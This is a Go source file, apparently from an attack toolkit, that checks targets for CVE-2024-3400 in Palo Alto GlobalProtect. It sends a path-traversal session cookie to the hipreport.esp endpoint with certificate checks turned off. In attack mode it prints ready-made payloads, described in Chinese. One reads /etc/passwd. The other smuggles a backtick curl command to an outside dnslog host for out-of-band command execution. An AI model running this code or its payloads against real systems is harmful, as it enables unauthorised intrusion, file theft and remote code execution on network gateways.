package CVEs

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func CVE_2024_3400(url string, Attack bool) error {
	randomNumber := generateRandomNumber()
	randomString := strconv.Itoa(randomNumber)
	payload := ""
	SESSID := fmt.Sprintf("SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/ycxlo%s.txt", randomString)
	headers := map[string]string{
		"Cookie":         SESSID,
		"Content-Length": "0",
		"Content-Type":   "application/x-www-form-urlencoded",
		"Connection":     "close",
	}

	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url3 := fmt.Sprintf("%s/global-protect/portal/images/ycxlo%s.txt", url, randomString)
	//fmt.Println("test")
	req3, err := http.NewRequest("GET", url3, nil)
	if err != nil {
		return err
	}
	response3, err := client.Do(req3)

	req, err := http.NewRequest("POST", url+"/ssl-vpn/hipreport.esp", strings.NewReader(payload))
	if err != nil {
		return err
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	response, err := client.Do(req)
	if err != nil {
		return err
	}

	url2 := fmt.Sprintf("%s/global-protect/portal/images/ycxlo%s.txt", url, randomString)
	req2, err := http.NewRequest("GET", url2, nil)
	if err != nil {
		return err
	}

	response2, err := client.Do(req2)
	if err != nil {
		return err
	}

	if response2.StatusCode == http.StatusForbidden && response.StatusCode == http.StatusOK && response3.StatusCode == http.StatusNotFound {
		fmt.Println("[*]CVE-2024-3400 : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "该漏洞可用于读取文件或者DNSLOG外带，均在POST方法下的/ssl-vpn/hipreport.esp路由，payload分别为 1. Cookie: SESSID=/../../../etc/passwd ; 2. Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/y`curl${IFS}http://xvsjn9.dnslog.cn`;\n")
		}
	}

	defer response2.Body.Close()

	return nil
}

func generateRandomNumber() int {
	rand.Seed(time.Now().UnixNano()) // 初始化随机数种子
	min := 10000
	max := 99999
	return rand.Intn(max-min+1) + min // 生成随机数
}
